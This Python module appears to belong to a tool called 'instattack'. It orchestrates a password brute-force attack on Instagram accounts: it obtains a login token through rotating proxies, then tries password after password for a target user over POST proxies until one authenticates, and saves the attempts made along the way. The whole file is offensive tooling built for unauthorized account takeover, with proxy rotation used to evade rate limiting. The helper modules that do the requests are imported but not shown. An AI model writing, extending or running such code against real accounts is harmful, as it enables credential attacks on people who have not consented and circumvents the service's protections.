import asyncio

from instattack.logger import AppLogger

from .tokens.exceptions import TokenNotFound
from .tokens import TokenHandler
from .login import LoginHandler
from .proxies import ProxyHandler


def get_handlers(config):

    lock = asyncio.Lock()
    start_event = asyncio.Event()

    proxy_handler = ProxyHandler(
        config,
        method='GET',
        lock=lock,
        start_event=start_event,
    )
    token_handler = TokenHandler(
        config,
        proxy_handler,
        start_event=start_event,
    )
    return proxy_handler, token_handler


def post_handlers(user, config):

    lock = asyncio.Lock()
    start_event = asyncio.Event()
    auth_result_found = asyncio.Event()

    proxy_handler = ProxyHandler(
        config,
        method='POST',
        lock=lock,
        start_event=start_event,
    )

    password_handler = LoginHandler(
        config,
        proxy_handler,
        user=user,
        start_event=start_event,
        stop_event=auth_result_found,
    )
    return proxy_handler, password_handler


async def get_token(loop, config):
    """
    Uses proxies specifically for GET requests to synchronously make
    requests to the INSTAGRAM_URL until a valid response is received with
    a token that can be used for subsequent stages.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    log = AppLogger('attack:get_token')

    get_proxy_handler, token_handler = get_handlers(config)

    try:
        results = await asyncio.gather(
            token_handler.run(loop),
            get_proxy_handler.run(loop)
        )
    except TokenNotFound as e:
        log.error(e)

        if not get_proxy_handler.broker._stopped:
            get_proxy_handler.broker.stop(loop)

        # Do we really want to save proxies on exceptions?
        await get_proxy_handler.pool.save(loop)
        return None

    except Exception as e:
        if not get_proxy_handler.broker._stopped:
            get_proxy_handler.broker.stop(loop)

        # Do we really want to save proxies on exceptions?
        await get_proxy_handler.pool.save(loop)

        loop.call_exception_handler({'exception': e})
        return None
    else:
        get_proxy_handler.broker.stop(loop)
        return results[0]


async def attack(loop, token, user, config):
    """
    Uses the token retrieved from the initial phase of the command to
    iteratively try each password for the given user with the provided
    token until a successful response is achieved for each password or
    a successful authenticated response is achieved for any password.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    post_proxy_handler, password_handler = post_handlers(user, config)

    try:
        results = await asyncio.gather(
            password_handler.run(loop, token),
            post_proxy_handler.run(loop)
        )

    except Exception as e:
        if not post_proxy_handler.broker._stopped:
            post_proxy_handler.broker.stop(loop)

        # We might need a stop method for the password handler still just in case
        # an exception is raised.
        # await password_handler.stop(loop)

        # Save Attempts Up Until This Point & Save Proxies
        # Do we really want to save proxies on exceptions?
        await password_handler.save(loop)
        await post_proxy_handler.pool.save(loop)

        loop.call_exception_handler({'exception': e})

    else:
        # Proxy Handler Should be Stopped?
        post_proxy_handler.broker.stop(loop)

        # We might need a stop method for the password handler still just in case
        # an exception is raised.
        # await password_handler.stop(loop)

        # Save Attempts Up Until This Point & Save Proxies
        await password_handler.save(loop)
        await post_proxy_handler.pool.save(loop)

        return results[0]
